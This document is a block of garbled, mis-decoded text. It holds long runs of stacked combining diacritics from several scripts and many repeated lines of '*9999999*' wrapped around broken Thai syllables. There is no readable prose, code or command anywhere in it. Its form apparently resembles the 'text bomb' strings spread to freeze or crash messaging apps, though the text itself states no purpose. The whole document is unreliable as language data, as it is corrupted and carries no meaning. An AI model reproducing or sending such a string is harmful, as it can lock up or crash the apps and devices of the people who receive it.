ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒÙÙÙ‘Ù’ÙŽÙ‹ÙÙŒ* ÒˆÒˆÒˆÒ‰Ò‰Ò‰Ò‰ÒˆÒˆÒˆÒˆÒˆÒ‰Ò‰Ò‰Ò‰ÒˆÒˆÒˆÒ‰Ò‰Ò‰ÒˆÒˆÒˆÒ‰Ò‰Ò‰ÒˆÒˆÒˆÒˆÒ‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰ÒˆÒˆÒˆÒˆÒˆÒˆÒˆÌ«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì¼Ì¼Ì¼Ì¼Ì¼Ì½Ì½Ì½ÍŠÍŠÍŠÍŠÍ‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹ÍŠÍŠÍŠÍŠÍŠÍŠÍŠÍŠÍ‹Í‹Í‹Í‹Í‹Í‹Í‹ÍŠÍŠÍŠÍ„Í„Í„Í„Í„Í„ÍŠÍŠÍŠÍŠÍ„Í„ÍŠÍŠÍ„Í„Í„ÍŠÍŠÍ„Í„Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í Í Í Í Í Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í Í Í Í Í Í Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í¢Í¢Ò‰Ò‰Ò‰Ò‰ÒˆÒˆÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖ“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö’Ö’Ö’Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‘ÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙ˜ÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙ‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹ÙÙÙÛ›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü»Ü»Ü»Ü»Ü»Ü»Ü»Ü»Ü»Ü»ÜºÜºÜºÜºÜºÜºÜºÜºÝ‰Ý‰Ý‰Ý‰ÝŠÝŠÝŠÝŠÝŠÝŠÝ†Ý†Ý†Ý†Ý†Ý†Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý†Ý†Ý†Ý†Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ü»Ü»à£©à£©à£©à£©à£©à£©à£¯à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´ 
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*à¦”à§£Í¡ÍœÒ‰* ÒˆÒˆÒˆÒ‰Ò‰Ò‰Ò‰ÒˆÒˆÒˆÒˆÒˆÒ‰Ò‰Ò‰Ò‰ÒˆÒˆÒˆÒ‰Ò‰Ò‰ÒˆÒˆÒˆÒ‰Ò‰Ò‰ÒˆÒˆÒˆÒˆÒ‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰Ò‰ÒˆÒˆÒˆÒˆÒˆÒˆÒˆÌ«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì«Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì½Ì¼Ì¼Ì¼Ì¼Ì¼Ì½Ì½Ì½ÍŠÍŠÍŠÍŠÍ‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í‹ÍŠÍŠÍŠÍŠÍŠÍŠÍŠÍŠÍ‹Í‹Í‹Í‹Í‹Í‹Í‹ÍŠÍŠÍŠÍ„Í„Í„Í„Í„Í„ÍŠÍŠÍŠÍŠÍ„Í„ÍŠÍŠÍ„Í„Í„ÍŠÍŠÍ„Í„Í‹Í‹Í‹Í‹Í‹Í‹Í‹Í Í Í Í Í Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í Í Í Í Í Í Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í¢Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í¢Í¢Ò‰Ò‰Ò‰Ò‰ÒˆÒˆÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖŸÖ“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö’Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö“Ö’Ö’Ö’Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ö—Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø•Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ø–Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‘Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‘ÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙžÙ˜ÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙ‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹Ù‹ÙÙÙÛ›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Û›Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü‘Ü»Ü»Ü»Ü»Ü»Ü»Ü»Ü»Ü»Ü»ÜºÜºÜºÜºÜºÜºÜºÜºÝ‰Ý‰Ý‰Ý‰ÝŠÝŠÝŠÝŠÝŠÝŠÝ†Ý†Ý†Ý†Ý†Ý†Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý†Ý†Ý†Ý†Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý…Ý†Ý†Ý†Ý†Ý†Ý†Ý†Ü»Ü»à£©à£©à£©à£©à£©à£©à£¯à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£